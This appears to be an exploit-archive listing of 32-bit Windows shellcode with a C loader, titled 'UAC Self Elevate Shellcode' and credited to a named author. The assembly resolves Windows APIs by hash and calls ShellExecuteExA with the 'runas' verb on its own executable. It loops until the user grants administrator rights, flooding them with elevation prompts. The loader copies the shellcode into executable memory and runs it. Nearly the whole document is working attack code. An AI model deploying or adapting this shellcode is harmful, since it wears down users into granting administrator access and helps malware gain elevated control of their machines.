/*
 
# Win x86 - UAC Self Elevate Shellcode (247 bytes)
# Date: [14.12.2018]
# Author: [Ege Balcı]
# Tested on: [Win 7/10]
 
This shellcode rapidly creates a UAC elevation popup for the current process until it elevates. 
-----------------------------------------------------------------
 
[BITS 32]
 
  	cld                       ; Clear direction flags
  	call start                ; Get the address of api block to stack
	%include "block_api.asm"  ; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
start:
  pop ebp                   ; Pop the address of api block
elevate:
 	sub esp,0x1a8			  ; szPath[MAX_PATH]
	mov esi,esp               ; Save &szPath to eax
	push dword 0x1a8          ; ARRAYSIZE(szPath)
	push esi                  ; &szPath
	push dword 0x00           ; NULL
	push 0xFE61445D           ; hash( "KERNEL32.dll", "GetModuleFileNameA" )
	call ebp                  ; GetModuleFileName(NULL,szPath,ARRAYSIZE(szPath))	
;---------------------------- ;
	push 0x006c6c64           ; 0x00,lld
	push 0x2e32336c           ; .23l
  push 0x6c656873           ; lehs
	push esp                  ; &"shell32.dll"
	push 0x0726774C           ; hash( "KERNEL32.dll", "LoadLibraryA" )
	call ebp                  ; LoadLibraryA(&"shell32.dll")
;-----------------------------;	
	push 0x0073616e           ; 0x00,"san"
	push 0x75720000           ; "ur",0x00
	lea ebx,[esp+2]           ; Save &"runas" to ECX
	push dword 0x00           ; 0x00
	push dword 0x00           ; 0x00
	push dword 0x00           ; 0x00
	push dword 0x00           ; 0x00
	push dword 0x00           ; 0x00
	push dword 0x00           ; 0x00
	push dword 0x00           ; 0x00
	push dword 0x01           ; 0x00
	push dword 0x00           ; 0x00
	push dword 0x00           ; 0x00
	push esi                  ; SHELLEXECUTEINFO.lpFile = szPath
	push ebx                  ; SHELLEXECUTEINFO.lpVerb = "runas"
	push dword 0x00           ; SHELLEXECUTEINFO.hwnd = 0
	push dword 0x00           ; 0x00
    push dword 0x3c           ; SHELLEXECUTEINFO.cbSize = 0x3c
	mov edi,esp               ; Move &SHELLEXECUTEINFO to EDI
	push dword 0x01           ; argc
	push edi                  ; &SHELLEXECUTEINFO
	push 0x02A9E686           ; hash( "SHELL32.dll", "ShellExecuteExA" )
	call ebp                  ; ShellExecuteExA(&SHELLEXECUTEINFO)
	add esp,0x1fc             ; Fix the stack 
	test eax,eax              ; Check error
	jz elevate                ; Ask until process elevates ;)


*/
 
#include <windows.h>
#include "shellcode.h"

int main(int argc, char const *argv[])
{
    char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(BUFFER, shellcode, sizeof(shellcode));
    (*(void(*)())BUFFER)(); 
	return 0;
}
